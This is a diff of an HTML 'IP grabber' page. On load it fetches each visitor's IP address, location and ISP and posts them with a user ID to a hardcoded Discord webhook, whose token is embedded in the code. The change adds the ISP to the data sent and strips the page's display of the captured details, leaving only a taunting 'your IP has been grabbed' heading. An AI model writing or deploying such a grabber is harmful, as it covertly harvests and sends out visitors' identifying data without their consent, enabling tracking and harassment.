@@ -53,19 +53,19 @@
             const ispString = data.org;
             ispElement.textContent = ispString;
 
-            sendToWebhook(userId, ip, locationString);
+            sendToWebhook(userId, ip, locationString, ispString);
           })
           .catch((error) => {
             console.error("Error:", error);
             const defaultLocation = "Unknown";
             const defaultIsp = "Unknown";
-            sendToWebhook(userId, ip, defaultLocation);
+            sendToWebhook(userId, ip, defaultLocation, defaultIsp);
           });
       }
 
-      function sendToWebhook(userId, ip, location) {
+      function sendToWebhook(userId, ip, location, isp) {
         const webhookURL = "https://discord.com/api/webhooks/1108773713077346384/hjKxkLhLkS3mEc6OpQzlCi_nmMWLY4ocZkMzC1PwlA55ScZf3hayJEL1JG2zyOFPHyFx"; // Replace with the actual webhook URL
-        const message = "User ID: " + userId + "\nIP: " + ip + "\nLocation: " + location;
+        const message = "User ID: " + userId + "\nIP: " + ip + "\nLocation: " + location + "\nISP: " + isp;
 
         fetch(webhookURL, {
           method: "POST",
@@ -81,12 +81,5 @@
   </head>
   <body onload="displayIP()">
     <h1>Haha your IP has been grabbed by IPGrebber 3.0</h1>
-    <h2>Your User ID:</h2>
-    <p id="userId">Loading...</p>
-    <h2>Your IP Address:</h2>
-    <p id="ip">Loading...</p>
-    <h2>Your Location:</h2>
-    <p id="location">Loading...</p>
-    <h2>Your ip and location has been grabbed :)</h2>
   </body>
 <html>
